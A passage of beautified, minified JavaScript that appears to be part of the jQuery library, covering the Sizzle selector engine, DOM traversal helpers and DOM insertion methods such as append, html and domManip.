                    } : q.find(w.pop(), 1 !== w.length || "~" !== w[0] && "+" !== w[0] || !b.parentNode ? b : b.parentNode, u), h = m.expr ? q.filter(m.expr, m.set) : m.set, 0 < w.length ? l = x(h) : y = !1; w.length;) k = t = w.pop(), r.relative[t] ? k = w.pop() : t = "", null == k && (k = b), r.relative[t](l, k, u);
            else l = [];
            l || (l = h);
            l || q.error(t || a);
            if ("[object Array]" === g.call(l))
                if (y)
                    if (b && 1 === b.nodeType)
                        for (a = 0; null != l[a]; a++) l[a] && (!0 === l[a] || 1 === l[a].nodeType && q.contains(b, l[a])) && c.push(h[a]);
                    else
                        for (a =
                            0; null != l[a]; a++) l[a] && 1 === l[a].nodeType && c.push(h[a]);
            else c.push.apply(c, l);
            else x(l, c);
            p && (q(p, f, c, d), q.uniqueSort(c));
            return c
        };
        q.uniqueSort = function(a) {
            if (H && (k = h, a.sort(H), k))
                for (var b = 1; b < a.length; b++) a[b] === a[b - 1] && a.splice(b--, 1);
            return a
        };
        q.matches = function(a, b) {
            return q(a, null, null, b)
        };
        q.matchesSelector = function(a, b) {
            return 0 < q(b, null, null, [a]).length
        };
        q.find = function(a, b, c) {
            var e, d, f, g, k, h;
            if (!a) return [];
            d = 0;
            for (f = r.order.length; d < f; d++)
                if (k = r.order[d], g = r.leftMatch[k].exec(a))
                    if (h = g[1],
                        g.splice(1, 1), "\\" !== h.substr(h.length - 1) && (g[1] = (g[1] || "").replace(l, ""), e = r.find[k](g, b, c), null != e)) {
                        a = a.replace(r.match[k], "");
                        break
                    }
            e || (e = "undefined" != typeof b.getElementsByTagName ? b.getElementsByTagName("*") : []);
            return {
                set: e,
                expr: a
            }
        };
        q.filter = function(a, b, c, e) {
            for (var d, f, g, k, h, l, p, n, t = a, y = [], u = b, v = b && b[0] && q.isXML(b[0]); a && b.length;) {
                for (g in r.filter)
                    if (null != (d = r.leftMatch[g].exec(a)) && d[2] && (l = r.filter[g], h = d[1], f = !1, d.splice(1, 1), "\\" !== h.substr(h.length - 1))) {
                        u === y && (y = []);
                        if (r.preFilter[g])
                            if (d =
                                r.preFilter[g](d, u, c, y, e, v), !d) f = k = !0;
                            else if (!0 === d) continue;
                        if (d)
                            for (p = 0; null != (h = u[p]); p++) h && (k = l(h, d, p, u), n = e ^ k, c && null != k ? n ? f = !0 : u[p] = !1 : n && (y.push(h), f = !0));
                        if (k !== m) {
                            c || (u = y);
                            a = a.replace(r.match[g], "");
                            if (!f) return [];
                            break
                        }
                    }
                if (a === t)
                    if (null == f) q.error(a);
                    else break;
                t = a
            }
            return u
        };
        q.error = function(a) {
            throw Error("Syntax error, unrecognized expression: " + a);
        };
        var t = q.getText = function(a) {
                var b, c;
                b = a.nodeType;
                var d = "";
                if (b)
                    if (1 === b || 9 === b || 11 === b) {
                        if ("string" == typeof a.textContent) return a.textContent;
                        if ("string" == typeof a.innerText) return a.innerText.replace(p, "");
                        for (a = a.firstChild; a; a = a.nextSibling) d += t(a)
                    } else {
                        if (3 === b || 4 === b) return a.nodeValue
                    }
                else
                    for (b = 0; c = a[b]; b++) 8 !== c.nodeType && (d += t(c));
                return d
            },
            r = q.selectors = {
                order: ["ID", "NAME", "TAG"],
                match: {
                    ID: /#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,
                    CLASS: /\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,
                    NAME: /\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,
                    ATTR: /\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,
                    TAG: /^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,
                    CHILD: /:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,
                    POS: /:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,
                    PSEUDO: /:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/
                },
                leftMatch: {},
                attrMap: {
                    "class": "className",
                    "for": "htmlFor"
                },
                attrHandle: {
                    href: function(a) {
                        return a.getAttribute("href")
                    },
                    type: function(a) {
                        return a.getAttribute("type")
                    }
                },
                relative: {
                    "+": function(a, b) {
                        var c =
                            "string" == typeof b,
                            d = c && !y.test(b),
                            c = c && !d;
                        d && (b = b.toLowerCase());
                        for (var d = 0, e = a.length, f; d < e; d++)
                            if (f = a[d]) {
                                for (;
                                    (f = f.previousSibling) && 1 !== f.nodeType;);
                                a[d] = c || f && f.nodeName.toLowerCase() === b ? f || !1 : f === b
                            }
                        c && q.filter(b, a, !0)
                    },
                    ">": function(a, b) {
                        var c, d = "string" == typeof b,
                            e = 0,
                            f = a.length;
                        if (d && !y.test(b))
                            for (b = b.toLowerCase(); e < f; e++) {
                                if (c = a[e]) c = c.parentNode, a[e] = c.nodeName.toLowerCase() === b ? c : !1
                            } else {
                                for (; e < f; e++)(c = a[e]) && (a[e] = d ? c.parentNode : c.parentNode === b);
                                d && q.filter(b, a, !0)
                            }
                    },
                    "": function(c,
                        d, e) {
                        var g, k = f++,
                            h = a;
                        "string" == typeof d && !y.test(d) && (d = d.toLowerCase(), g = d, h = b);
                        h("parentNode", d, k, c, g, e)
                    },
                    "~": function(c, d, e) {
                        var g, k = f++,
                            h = a;
                        "string" == typeof d && !y.test(d) && (d = d.toLowerCase(), g = d, h = b);
                        h("previousSibling", d, k, c, g, e)
                    }
                },
                find: {
                    ID: function(a, b, c) {
                        if ("undefined" != typeof b.getElementById && !c) return (a = b.getElementById(a[1])) && a.parentNode ? [a] : []
                    },
                    NAME: function(a, b) {
                        if ("undefined" != typeof b.getElementsByName) {
                            for (var c = [], d = b.getElementsByName(a[1]), e = 0, f = d.length; e < f; e++) d[e].getAttribute("name") ===
                                a[1] && c.push(d[e]);
                            return 0 === c.length ? null : c
                        }
                    },
                    TAG: function(a, b) {
                        if ("undefined" != typeof b.getElementsByTagName) return b.getElementsByTagName(a[1])
                    }
                },
                preFilter: {
                    CLASS: function(a, b, c, d, e, f) {
                        a = " " + a[1].replace(l, "") + " ";
                        if (f) return a;
                        f = 0;
                        for (var g; null != (g = b[f]); f++) g && (e ^ (g.className && 0 <= (" " + g.className + " ").replace(/[\t\n\r]/g, " ").indexOf(a)) ? c || d.push(g) : c && (b[f] = !1));
                        return !1
                    },
                    ID: function(a) {
                        return a[1].replace(l, "")
                    },
                    TAG: function(a, b) {
                        return a[1].replace(l, "").toLowerCase()
                    },
                    CHILD: function(a) {
                        if ("nth" ===
                            a[1]) {
                            a[2] || q.error(a[0]);
                            a[2] = a[2].replace(/^\+|\s*/g, "");
                            var b = /(-?)(\d*)(?:n([+\-]?\d*))?/.exec("even" === a[2] && "2n" || "odd" === a[2] && "2n+1" || !/\D/.test(a[2]) && "0n+" + a[2] || a[2]);
                            a[2] = b[1] + (b[2] || 1) - 0;
                            a[3] = b[3] - 0
                        } else a[2] && q.error(a[0]);
                        a[0] = f++;
                        return a
                    },
                    ATTR: function(a, b, c, d, e, f) {
                        b = a[1] = a[1].replace(l, "");
                        !f && r.attrMap[b] && (a[1] = r.attrMap[b]);
                        a[4] = (a[4] || a[5] || "").replace(l, "");
                        "~=" === a[2] && (a[4] = " " + a[4] + " ");
                        return a
                    },
                    PSEUDO: function(a, b, c, d, f) {
                        if ("not" === a[1])
                            if (1 < (e.exec(a[3]) || "").length ||
                                /^\w/.test(a[3])) a[3] = q(a[3], null, null, b);
                            else return a = q.filter(a[3], b, c, 1 ^ f), c || d.push.apply(d, a), !1;
                        else if (r.match.POS.test(a[0]) || r.match.CHILD.test(a[0])) return !0;
                        return a
                    },
                    POS: function(a) {
                        a.unshift(!0);
                        return a
                    }
                },
                filters: {
                    enabled: function(a) {
                        return !1 === a.disabled && "hidden" !== a.type
                    },
                    disabled: function(a) {
                        return !0 === a.disabled
                    },
                    checked: function(a) {
                        return !0 === a.checked
                    },
                    selected: function(a) {
                        a.parentNode && a.parentNode.selectedIndex;
                        return !0 === a.selected
                    },
                    parent: function(a) {
                        return !!a.firstChild
                    },
                    empty: function(a) {
                        return !a.firstChild
                    },
                    has: function(a, b, c) {
                        return !!q(c[3], a).length
                    },
                    header: function(a) {
                        return /h\d/i.test(a.nodeName)
                    },
                    text: function(a) {
                        var b = a.getAttribute("type"),
                            c = a.type;
                        return "input" === a.nodeName.toLowerCase() && "text" === c && (b === c || null === b)
                    },
                    radio: function(a) {
                        return "input" === a.nodeName.toLowerCase() && "radio" === a.type
                    },
                    checkbox: function(a) {
                        return "input" === a.nodeName.toLowerCase() && "checkbox" === a.type
                    },
                    file: function(a) {
                        return "input" === a.nodeName.toLowerCase() && "file" === a.type
                    },
                    password: function(a) {
                        return "input" === a.nodeName.toLowerCase() && "password" === a.type
                    },
                    submit: function(a) {
                        var b = a.nodeName.toLowerCase();
                        return ("input" === b || "button" === b) && "submit" === a.type
                    },
                    image: function(a) {
                        return "input" === a.nodeName.toLowerCase() && "image" === a.type
                    },
                    reset: function(a) {
                        var b = a.nodeName.toLowerCase();
                        return ("input" === b || "button" === b) && "reset" === a.type
                    },
                    button: function(a) {
                        var b = a.nodeName.toLowerCase();
                        return "input" === b && "button" === a.type || "button" === b
                    },
                    input: function(a) {
                        return /input|select|textarea|button/i.test(a.nodeName)
                    },
                    focus: function(a) {
                        return a === a.ownerDocument.activeElement
                    }
                },
                setFilters: {
                    first: function(a, b) {
                        return 0 === b
                    },
                    last: function(a, b, c, d) {
                        return b === d.length - 1
                    },
                    even: function(a, b) {
                        return 0 === b % 2
                    },
                    odd: function(a, b) {
                        return 1 === b % 2
                    },
                    lt: function(a, b, c) {
                        return b < c[3] - 0
                    },
                    gt: function(a, b, c) {
                        return b > c[3] - 0
                    },
                    nth: function(a, b, c) {
                        return c[3] - 0 === b
                    },
                    eq: function(a, b, c) {
                        return c[3] - 0 === b
                    }
                },
                filter: {
                    PSEUDO: function(a, b, c, d) {
                        var e = b[1],
                            f = r.filters[e];
                        if (f) return f(a, c, b, d);
                        if ("contains" === e) return 0 <= (a.textContent || a.innerText ||
                            t([a]) || "").indexOf(b[3]);
                        if ("not" === e) {
                            b = b[3];
                            c = 0;
                            for (d = b.length; c < d; c++)
                                if (b[c] === a) return !1;
                            return !0
                        }
                        q.error(e)
                    },
                    CHILD: function(a, b) {
                        var c, e, f, g, k, h;
                        c = b[1];
                        h = a;
                        switch (c) {
                            case "only":
                            case "first":
                                for (; h = h.previousSibling;)
                                    if (1 === h.nodeType) return !1;
                                if ("first" === c) return !0;
                                h = a;
                            case "last":
                                for (; h = h.nextSibling;)
                                    if (1 === h.nodeType) return !1;
                                return !0;
                            case "nth":
                                c = b[2];
                                e = b[3];
                                if (1 === c && 0 === e) return !0;
                                f = b[0];
                                if ((g = a.parentNode) && (g[d] !== f || !a.nodeIndex)) {
                                    k = 0;
                                    for (h = g.firstChild; h; h = h.nextSibling) 1 === h.nodeType &&
                                        (h.nodeIndex = ++k);
                                    g[d] = f
                                }
                                h = a.nodeIndex - e;
                                return 0 === c ? 0 === h : 0 === h % c && 0 <= h / c
                        }
                    },
                    ID: function(a, b) {
                        return 1 === a.nodeType && a.getAttribute("id") === b
                    },
                    TAG: function(a, b) {
                        return "*" === b && 1 === a.nodeType || !!a.nodeName && a.nodeName.toLowerCase() === b
                    },
                    CLASS: function(a, b) {
                        return -1 < (" " + (a.className || a.getAttribute("class")) + " ").indexOf(b)
                    },
                    ATTR: function(a, b) {
                        var c = b[1],
                            c = q.attr ? q.attr(a, c) : r.attrHandle[c] ? r.attrHandle[c](a) : null != a[c] ? a[c] : a.getAttribute(c),
                            d = c + "",
                            e = b[2],
                            f = b[4];
                        return null == c ? "!=" === e : !e && q.attr ?
                            null != c : "=" === e ? d === f : "*=" === e ? 0 <= d.indexOf(f) : "~=" === e ? 0 <= (" " + d + " ").indexOf(f) : f ? "!=" === e ? d !== f : "^=" === e ? 0 === d.indexOf(f) : "$=" === e ? d.substr(d.length - f.length) === f : "|=" === e ? d === f || d.substr(0, f.length + 1) === f + "-" : !1 : d && !1 !== c
                    },
                    POS: function(a, b, c, d) {
                        var e = r.setFilters[b[2]];
                        if (e) return e(a, c, b, d)
                    }
                }
            },
            B = r.match.POS,
            A = function(a, b) {
                return "\\" + (b - 0 + 1)
            },
            u;
        for (u in r.match) r.match[u] = new RegExp(r.match[u].source + /(?![^\[]*\])(?![^\(]*\))/.source), r.leftMatch[u] = new RegExp(/(^(?:.|\r|\n)*?)/.source + r.match[u].source.replace(/\\(\d+)/g,
            A));
        r.match.globalPOS = B;
        var x = function(a, b) {
            a = Array.prototype.slice.call(a, 0);
            return b ? (b.push.apply(b, a), b) : a
        };
        try {
            Array.prototype.slice.call(n.documentElement.childNodes, 0)[0].nodeType
        } catch (C) {
            x = function(a, b) {
                var c = 0,
                    d = b || [];
                if ("[object Array]" === g.call(a)) Array.prototype.push.apply(d, a);
                else if ("number" == typeof a.length)
                    for (var e = a.length; c < e; c++) d.push(a[c]);
                else
                    for (; a[c]; c++) d.push(a[c]);
                return d
            }
        }
        var H, v;
        n.documentElement.compareDocumentPosition ? H = function(a, b) {
            return a === b ? (k = !0, 0) : a.compareDocumentPosition &&
                b.compareDocumentPosition ? a.compareDocumentPosition(b) & 4 ? -1 : 1 : a.compareDocumentPosition ? -1 : 1
        } : (H = function(a, b) {
                if (a === b) return k = !0, 0;
                if (a.sourceIndex && b.sourceIndex) return a.sourceIndex - b.sourceIndex;
                var c, d, e = [],
                    f = [];
                c = a.parentNode;
                d = b.parentNode;
                var g = c;
                if (c === d) return v(a, b);
                if (!c) return -1;
                if (!d) return 1;
                for (; g;) e.unshift(g), g = g.parentNode;
                for (g = d; g;) f.unshift(g), g = g.parentNode;
                c = e.length;
                d = f.length;
                for (g = 0; g < c && g < d; g++)
                    if (e[g] !== f[g]) return v(e[g], f[g]);
                return g === c ? v(a, f[g], -1) : v(e[g], b, 1)
            },
            v = function(a, b, c) {
                if (a === b) return c;
                for (a = a.nextSibling; a;) {
                    if (a === b) return -1;
                    a = a.nextSibling
                }
                return 1
            });
        (function() {
            var a = n.createElement("div"),
                b = "script" + (new Date).getTime(),
                c = n.documentElement;
            a.innerHTML = "<a name='" + b + "'/>";
            c.insertBefore(a, c.firstChild);
            n.getElementById(b) && (r.find.ID = function(a, b, c) {
                    if ("undefined" != typeof b.getElementById && !c) return (b = b.getElementById(a[1])) ? b.id === a[1] || "undefined" != typeof b.getAttributeNode && b.getAttributeNode("id").nodeValue === a[1] ? [b] : m : []
                }, r.filter.ID =
                function(a, b) {
                    var c = "undefined" != typeof a.getAttributeNode && a.getAttributeNode("id");
                    return 1 === a.nodeType && c && c.nodeValue === b
                });
            c.removeChild(a);
            c = a = null
        })();
        (function() {
            var a = n.createElement("div");
            a.appendChild(n.createComment(""));
            0 < a.getElementsByTagName("*").length && (r.find.TAG = function(a, b) {
                var c = b.getElementsByTagName(a[1]);
                if ("*" === a[1]) {
                    for (var d = [], e = 0; c[e]; e++) 1 === c[e].nodeType && d.push(c[e]);
                    c = d
                }
                return c
            });
            a.innerHTML = "<a href='#'></a>";
            a.firstChild && "undefined" != typeof a.firstChild.getAttribute &&
                "#" !== a.firstChild.getAttribute("href") && (r.attrHandle.href = function(a) {
                    return a.getAttribute("href", 2)
                });
            a = null
        })();
        n.querySelectorAll && function() {
            var a = q,
                b = n.createElement("div");
            b.innerHTML = "<p class='TEST'></p>";
            if (!b.querySelectorAll || 0 !== b.querySelectorAll(".TEST").length) {
                q = function(b, c, d, e) {
                    c = c || n;
                    if (!e && !q.isXML(c)) {
                        var f = /^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);
                        if (f && (1 === c.nodeType || 9 === c.nodeType)) {
                            if (f[1]) return x(c.getElementsByTagName(b), d);
                            if (f[2] && r.find.CLASS && c.getElementsByClassName) return x(c.getElementsByClassName(f[2]),
                                d)
                        }
                        if (9 === c.nodeType) {
                            if ("body" === b && c.body) return x([c.body], d);
                            if (f && f[3]) {
                                var g = c.getElementById(f[3]);
                                if (!g || !g.parentNode) return x([], d);
                                if (g.id === f[3]) return x([g], d)
                            }
                            try {
                                return x(c.querySelectorAll(b), d)
                            } catch (k) {}
                        } else if (1 === c.nodeType && "object" !== c.nodeName.toLowerCase()) {
                            var f = c,
                                h = (g = c.getAttribute("id")) || "__sizzle__",
                                l = c.parentNode,
                                p = /^\s*[+~]/.test(b);
                            g ? h = h.replace(/'/g, "\\$&") : c.setAttribute("id", h);
                            p && l && (c = c.parentNode);
                            try {
                                if (!p || l) return x(c.querySelectorAll("[id='" + h + "'] " + b),
                                    d)
                            } catch (m) {} finally {
                                g || f.removeAttribute("id")
                            }
                        }
                    }
                    return a(b, c, d, e)
                };
                for (var c in a) q[c] = a[c];
                b = null
            }
        }();
        (function() {
            var a = n.documentElement,
                b = a.matchesSelector || a.mozMatchesSelector || a.webkitMatchesSelector || a.msMatchesSelector;
            if (b) {
                var c = !b.call(n.createElement("div"), "div"),
                    d = !1;
                try {
                    b.call(n.documentElement, "[test!='']:sizzle")
                } catch (e) {
                    d = !0
                }
                q.matchesSelector = function(a, e) {
                    e = e.replace(/\=\s*([^'"\]]*)\s*\]/g, "='$1']");
                    if (!q.isXML(a)) try {
                        if (d || !r.match.PSEUDO.test(e) && !/!=/.test(e)) {
                            var f = b.call(a,
                                e);
                            if (f || !c || a.document && 11 !== a.document.nodeType) return f
                        }
                    } catch (g) {}
                    return 0 < q(e, null, null, [a]).length
                }
            }
        })();
        (function() {
            var a = n.createElement("div");
            a.innerHTML = "<div class='test e'></div><div class='test'></div>";
            a.getElementsByClassName && 0 !== a.getElementsByClassName("e").length && (a.lastChild.className = "e", 1 !== a.getElementsByClassName("e").length && (r.order.splice(1, 0, "CLASS"), r.find.CLASS = function(a, b, c) {
                    if ("undefined" != typeof b.getElementsByClassName && !c) return b.getElementsByClassName(a[1])
                },
                a = null))
        })();
        n.documentElement.contains ? q.contains = function(a, b) {
            return a !== b && (a.contains ? a.contains(b) : !0)
        } : n.documentElement.compareDocumentPosition ? q.contains = function(a, b) {
            return !!(a.compareDocumentPosition(b) & 16)
        } : q.contains = function() {
            return !1
        };
        q.isXML = function(a) {
            return (a = (a ? a.ownerDocument || a : 0).documentElement) ? "HTML" !== a.nodeName : !1
        };
        var D = function(a, b, c) {
            var d, e = [],
                f = "";
            for (b = b.nodeType ? [b] : b; d = r.match.PSEUDO.exec(a);) f += d[0], a = a.replace(r.match.PSEUDO, "");
            a = r.relative[a] ? a + "*" : a;
            d = 0;
            for (var g = b.length; d < g; d++) q(a, b[d], e, c);
            return q.filter(f, e)
        };
        q.attr = c.attr;
        q.selectors.attrMap = {};
        c.find = q;
        c.expr = q.selectors;
        c.expr[":"] = c.expr.filters;
        c.unique = q.uniqueSort;
        c.text = q.getText;
        c.isXMLDoc = q.isXML;
        c.contains = q.contains
    })();
    var Eb = /Until$/,
        Fb = /^(?:parents|prevUntil|prevAll)/,
        Gb = /,/,
        ob = /^.[^:#\[\.,]*$/,
        Hb = Array.prototype.slice,
        Xa = c.expr.match.globalPOS,
        Ib = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };
    c.fn.extend({
        find: function(a) {
            var b = this,
                e, d;
            if ("string" != typeof a) return c(a).filter(function() {
                e =
                    0;
                for (d = b.length; e < d; e++)
                    if (c.contains(b[e], this)) return !0
            });
            var f = this.pushStack("", "find", a),
                g, k, h;
            e = 0;
            for (d = this.length; e < d; e++)
                if (g = f.length, c.find(a, this[e], f), 0 < e)
                    for (k = g; k < f.length; k++)
                        for (h = 0; h < g; h++)
                            if (f[h] === f[k]) {
                                f.splice(k--, 1);
                                break
                            }
            return f
        },
        has: function(a) {
            var b = c(a);
            return this.filter(function() {
                for (var a = 0, d = b.length; a < d; a++)
                    if (c.contains(this, b[a])) return !0
            })
        },
        not: function(a) {
            return this.pushStack(Ha(this, a, !1), "not", a)
        },
        filter: function(a) {
            return this.pushStack(Ha(this, a, !0), "filter",
                a)
        },
        is: function(a) {
            return !!a && ("string" == typeof a ? Xa.test(a) ? 0 <= c(a, this.context).index(this[0]) : 0 < c.filter(a, this).length : 0 < this.filter(a).length)
        },
        closest: function(a, b) {
            var e = [],
                d, f, g = this[0];
            if (c.isArray(a)) {
                for (f = 1; g && g.ownerDocument && g !== b;) {
                    for (d = 0; d < a.length; d++) c(g).is(a[d]) && e.push({
                        selector: a[d],
                        elem: g,
                        level: f
                    });
                    g = g.parentNode;
                    f++
                }
                return e
            }
            var k = Xa.test(a) || "string" != typeof a ? c(a, b || this.context) : 0;
            d = 0;
            for (f = this.length; d < f; d++)
                for (g = this[d]; g;) {
                    if (k ? -1 < k.index(g) : c.find.matchesSelector(g,
                            a)) {
                        e.push(g);
                        break
                    }
                    g = g.parentNode;
                    if (!g || !g.ownerDocument || g === b || 11 === g.nodeType) break
                }
            e = 1 < e.length ? c.unique(e) : e;
            return this.pushStack(e, "closest", a)
        },
        index: function(a) {
            return a ? "string" == typeof a ? c.inArray(this[0], c(a)) : c.inArray(a.jquery ? a[0] : a, this) : this[0] && this[0].parentNode ? this.prevAll().length : -1
        },
        add: function(a, b) {
            var e = "string" == typeof a ? c(a, b) : c.makeArray(a && a.nodeType ? [a] : a),
                d = c.merge(this.get(), e);
            return this.pushStack(Ia(e[0]) || Ia(d[0]) ? d : c.unique(d))
        },
        andSelf: function() {
            return this.add(this.prevObject)
        }
    });
    c.each({
        parent: function(a) {
            return (a = a.parentNode) && 11 !== a.nodeType ? a : null
        },
        parents: function(a) {
            return c.dir(a, "parentNode")
        },
        parentsUntil: function(a, b, e) {
            return c.dir(a, "parentNode", e)
        },
        next: function(a) {
            return c.nth(a, 2, "nextSibling")
        },
        prev: function(a) {
            return c.nth(a, 2, "previousSibling")
        },
        nextAll: function(a) {
            return c.dir(a, "nextSibling")
        },
        prevAll: function(a) {
            return c.dir(a, "previousSibling")
        },
        nextUntil: function(a, b, e) {
            return c.dir(a, "nextSibling", e)
        },
        prevUntil: function(a, b, e) {
            return c.dir(a, "previousSibling",
                e)
        },
        siblings: function(a) {
            return c.sibling((a.parentNode || {}).firstChild, a)
        },
        children: function(a) {
            return c.sibling(a.firstChild)
        },
        contents: function(a) {
            return c.nodeName(a, "iframe") ? a.contentDocument || a.contentWindow.document : c.makeArray(a.childNodes)
        }
    }, function(a, b) {
        c.fn[a] = function(e, d) {
            var f = c.map(this, b, e);
            Eb.test(a) || (d = e);
            d && "string" == typeof d && (f = c.filter(d, f));
            f = 1 < this.length && !Ib[a] ? c.unique(f) : f;
            (1 < this.length || Gb.test(d)) && Fb.test(a) && (f = f.reverse());
            return this.pushStack(f, a, Hb.call(arguments).join(","))
        }
    });
    c.extend({
        filter: function(a, b, e) {
            e && (a = ":not(" + a + ")");
            return 1 === b.length ? c.find.matchesSelector(b[0], a) ? [b[0]] : [] : c.find.matches(a, b)
        },
        dir: function(a, b, e) {
            var d = [];
            for (a = a[b]; a && 9 !== a.nodeType && (e === m || 1 !== a.nodeType || !c(a).is(e));) 1 === a.nodeType && d.push(a), a = a[b];
            return d
        },
        nth: function(a, b, c, d) {
            b = b || 1;
            for (d = 0; a && (1 !== a.nodeType || ++d !== b); a = a[c]);
            return a
        },
        sibling: function(a, b) {
            for (var c = []; a; a = a.nextSibling) 1 === a.nodeType && a !== b && c.push(a);
            return c
        }
    });
    var Ga = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
        Jb = / jQuery\d+="(?:\d+|null)"/g,
        pa = /^\s+/,
        Ya = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,
        Za = /<([\w:]+)/,
        Kb = /<tbody/i,
        Lb = /<|&#?\w+;/,
        Mb = /<(?:script|style)/i,
        Nb = /<(?:script|object|embed|option|style)/i,
        $a = new RegExp("<(?:" + Ga + ")[\\s/>]", "i"),
        ab = /checked\s*(?:[^=]|=\s*.checked.)/i,
        bb = /\/(java|ecma)script/i,
        Ob = /^\s*<!(?:\[CDATA\[|\-\-)/,
        C = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            legend: [1, "<fieldset>", "</fieldset>"],
            thead: [1, "<table>", "</table>"],
            tr: [2, "<table><tbody>",
                "</tbody></table>"
            ],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
            area: [1, "<map>", "</map>"],
            _default: [0, "", ""]
        },
        qa = Fa(n);
    C.optgroup = C.option;
    C.tbody = C.tfoot = C.colgroup = C.caption = C.thead;
    C.th = C.td;
    c.support.htmlSerialize || (C._default = [1, "div<div>", "</div>"]);
    c.fn.extend({
        text: function(a) {
            return c.access(this, function(a) {
                    return a === m ? c.text(this) : this.empty().append((this[0] && this[0].ownerDocument || n).createTextNode(a))
                }, null, a,
                arguments.length)
        },
        wrapAll: function(a) {
            if (c.isFunction(a)) return this.each(function(b) {
                c(this).wrapAll(a.call(this, b))
            });
            if (this[0]) {
                var b = c(a, this[0].ownerDocument).eq(0).clone(!0);
                this[0].parentNode && b.insertBefore(this[0]);
                b.map(function() {
                    for (var a = this; a.firstChild && 1 === a.firstChild.nodeType;) a = a.firstChild;
                    return a
                }).append(this)
            }
            return this
        },
        wrapInner: function(a) {
            return c.isFunction(a) ? this.each(function(b) {
                c(this).wrapInner(a.call(this, b))
            }) : this.each(function() {
                var b = c(this),
                    e = b.contents();
                e.length ? e.wrapAll(a) : b.append(a)
            })
        },
        wrap: function(a) {
            var b = c.isFunction(a);
            return this.each(function(e) {
                c(this).wrapAll(b ? a.call(this, e) : a)
            })
        },
        unwrap: function() {
            return this.parent().each(function() {
                c.nodeName(this, "body") || c(this).replaceWith(this.childNodes)
            }).end()
        },
        append: function() {
            return this.domManip(arguments, !0, function(a) {
                1 === this.nodeType && this.appendChild(a)
            })
        },
        prepend: function() {
            return this.domManip(arguments, !0, function(a) {
                1 === this.nodeType && this.insertBefore(a, this.firstChild)
            })
        },
        before: function() {
            if (this[0] &&
                this[0].parentNode) return this.domManip(arguments, !1, function(a) {
                this.parentNode.insertBefore(a, this)
            });
            if (arguments.length) {
                var a = c.clean(arguments);
                a.push.apply(a, this.toArray());
                return this.pushStack(a, "before", arguments)
            }
        },
        after: function() {
            if (this[0] && this[0].parentNode) return this.domManip(arguments, !1, function(a) {
                this.parentNode.insertBefore(a, this.nextSibling)
            });
            if (arguments.length) {
                var a = this.pushStack(this, "after", arguments);
                a.push.apply(a, c.clean(arguments));
                return a
            }
        },
        remove: function(a,
            b) {
            for (var e = 0, d; null != (d = this[e]); e++)
                if (!a || c.filter(a, [d]).length) !b && 1 === d.nodeType && (c.cleanData(d.getElementsByTagName("*")), c.cleanData([d])), d.parentNode && d.parentNode.removeChild(d);
            return this
        },
        empty: function() {
            for (var a = 0, b; null != (b = this[a]); a++)
                for (1 === b.nodeType && c.cleanData(b.getElementsByTagName("*")); b.firstChild;) b.removeChild(b.firstChild);
            return this
        },
        clone: function(a, b) {
            a = null == a ? !1 : a;
            b = null == b ? a : b;
            return this.map(function() {
                return c.clone(this, a, b)
            })
        },
        html: function(a) {
            return c.access(this,
                function(a) {
                    var e = this[0] || {},
                        d = 0,
                        f = this.length;
                    if (a === m) return 1 === e.nodeType ? e.innerHTML.replace(Jb, "") : null;
                    if (!("string" != typeof a || Mb.test(a) || !c.support.leadingWhitespace && pa.test(a) || C[(Za.exec(a) || ["", ""])[1].toLowerCase()])) {
                        a = a.replace(Ya, "<$1></$2>");
                        try {
                            for (; d < f; d++) e = this[d] || {}, 1 === e.nodeType && (c.cleanData(e.getElementsByTagName("*")), e.innerHTML = a);
                            e = 0
                        } catch (g) {}
                    }
                    e && this.empty().append(a)
                }, null, a, arguments.length)
        },
        replaceWith: function(a) {
            if (this[0] && this[0].parentNode) {
                if (c.isFunction(a)) return this.each(function(b) {
                    var e =
                        c(this),
                        d = e.html();
                    e.replaceWith(a.call(this, b, d))
                });
                "string" != typeof a && (a = c(a).detach());
                return this.each(function() {
                    var b = this.nextSibling,
                        e = this.parentNode;
                    c(this).remove();
                    b ? c(b).before(a) : c(e).append(a)
                })
            }
            return this.length ? this.pushStack(c(c.isFunction(a) ? a() : a), "replaceWith", a) : this
        },
        detach: function(a) {
            return this.remove(a, !0)
        },
        domManip: function(a, b, e) {
            var d, f, g, k = a[0],
                h = [];
            if (!c.support.checkClone && 3 === arguments.length && "string" == typeof k && ab.test(k)) return this.each(function() {
                c(this).domManip(a,
                    b, e, !0)
            });
            if (c.isFunction(k)) return this.each(function(d) {
                var f = c(this);
                a[0] = k.call(this, d, b ? f.html() : m);
                f.domManip(a, b, e)
            });
            if (this[0]) {
                g = k && k.parentNode;
                c.support.parentNode && g && 11 === g.nodeType && g.childNodes.length === this.length ? d = {
                    fragment: g
                } : d = c.buildFragment(a, this, h);
                g = d.fragment;
                1 === g.childNodes.length ? f = g = g.firstChild : f = g.firstChild;
                if (f) {
                    b = b && c.nodeName(f, "tr");
                    for (var l = 0, p = this.length, n = p - 1; l < p; l++) e.call(b ? nb(this[l], f) : this[l], d.cacheable || 1 < p && l < n ? c.clone(g, !0, !0) : g)
                }
                h.length && c.each(h,
                    function(a, b) {
                        b.src ? c.ajax({
                            type: "GET",
                            global: !1,
                            url: b.src,
                            async: !1,
                            dataType: "script"
